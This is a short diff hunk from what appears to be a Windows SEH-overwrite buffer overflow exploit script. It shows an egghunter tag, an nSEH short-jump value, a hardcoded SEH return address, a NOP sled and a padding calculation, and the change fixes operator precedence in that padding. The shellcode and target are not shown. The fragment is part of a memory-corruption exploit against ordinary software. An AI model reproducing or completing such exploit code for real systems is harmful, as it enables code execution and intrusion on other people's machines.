@@ -97,7 +97,7 @@ tag = "DaltDalt"
 nseh = "\xeb\x06\x90\x90"
 seh = "\xdb\x65\x41\x00" #004165db
 nops = "\x90"*100
-morejunk = "B" * 330-(len(junk)-len(tag)-len(shellcode))
+morejunk = "B" * (330-(len(junk)-len(tag)-len(shellcode)))
 
 
 
